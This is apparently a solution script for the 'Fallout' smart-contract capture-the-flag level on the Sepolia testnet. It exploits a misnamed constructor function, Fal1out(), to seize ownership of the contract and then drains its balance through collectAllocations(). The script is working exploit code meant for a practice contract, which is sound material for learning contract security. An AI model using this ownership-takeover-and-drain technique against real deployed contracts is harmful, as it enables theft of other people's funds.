import { ethers } from "hardhat";

/**
 * Script to solve the Level 2: Fallout challenge
 * This script exploits the vulnerability in the Fallout contract
 * to take ownership by calling the Fal1out() function
 * 
 * Usage: 
 * npx hardhat run scripts/level-02-fallout/solve-fallout.ts --network sepolia
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-02-fallout/solve-fallout.ts --network sepolia
 */

// Define interface for the Fallout contract to fix TypeScript errors
interface FalloutContract extends ethers.Contract {
  owner(): Promise<string>;
  Fal1out(overrides?: {value: bigint}): Promise<ethers.ContractTransaction>;
  collectAllocations(): Promise<ethers.ContractTransaction>;
  allocatorBalance(allocator: string): Promise<bigint>;
}

async function main() {
  // Get the contract address from environment variable or use default
  const defaultAddress = "0x946D0852932CFCA49879d3490bA90bfa417B6319"; // Replace with your deployed contract address
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Connecting to Fallout contract at address: ${contractAddress}`);
  
  // Get the contract factory and attach to the deployed contract
  const FalloutFactory = await ethers.getContractFactory("Fallout");
  const fallout = FalloutFactory.attach(contractAddress) as unknown as FalloutContract;
  
  // Get signers (we'll use the first one as our attacker)
  const [attacker] = await ethers.getSigners();
  console.log(`Attacker address: ${attacker.address}`);
  
  try {
    // Step 1: Check initial state
    console.log("\n--- Initial State ---");
    const initialOwner = await fallout.owner();
    console.log(`Current owner: ${initialOwner}`);
    
    const contractBalance = await ethers.provider.getBalance(contractAddress);
    console.log(`Contract balance: ${ethers.formatEther(contractBalance)} ETH`);
    
    // Step 2: Call the Fal1out function to become the owner
    console.log("\n--- Step 1: Calling Fal1out() function ---");
    // We can send some ETH with the call, but it's not necessary
    const fal1outTx = await fallout.Fal1out({ value: ethers.parseEther("0.0000000000000001") }); // 10 wei
    await fal1outTx.wait();
    console.log("Fal1out transaction successful!");
    
    // Step 3: Check if we became the owner
    console.log("\n--- Step 2: Checking ownership ---");
    const newOwner = await fallout.owner();
    console.log(`New owner: ${newOwner}`);
    
    if (newOwner === attacker.address) {
      console.log("✅ Ownership successfully taken!");
    } else {
      console.log("❌ Failed to take ownership.");
      return;
    }
    
    // Step 4: Check contract balance before withdrawal
    const balanceBeforeWithdraw = await ethers.provider.getBalance(contractAddress);
    console.log(`\nContract balance before withdrawal: ${ethers.formatEther(balanceBeforeWithdraw)} ETH`);
    
    // Step 5: Withdraw all funds using collectAllocations
    console.log("\n--- Step 3: Withdrawing all funds ---");
    const withdrawTx = await fallout.collectAllocations();
    await withdrawTx.wait();
    console.log("Withdrawal transaction successful!");
    
    // Step 6: Check contract balance after withdrawal
    const balanceAfterWithdraw = await ethers.provider.getBalance(contractAddress);
    console.log(`Contract balance after withdrawal: ${ethers.formatEther(balanceAfterWithdraw)} ETH`);
    
    if (balanceAfterWithdraw == 0n) {
      console.log("\n🎉 Congratulations! You've completed the Fallout challenge! 🎉");
    } else {
      console.log("\n❌ Something went wrong. The contract still has funds.");
    }
    
  } catch (error) {
    console.error("Error solving the Fallout challenge:", error);
  }
}

// Execute the main function and handle any errors
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
